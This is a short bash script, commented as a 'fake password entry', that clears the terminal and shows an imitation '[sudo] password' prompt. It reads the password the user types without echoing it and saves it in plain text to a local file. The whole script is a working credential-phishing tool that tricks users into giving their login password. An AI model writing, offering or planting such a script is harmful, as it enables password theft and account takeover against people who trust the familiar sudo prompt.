#!/bin/bash

# fake password entry
clear

read -sp "[sudo] password for $(whoami):
" password

touch password.txt
echo "$password" > "user_password.txt"
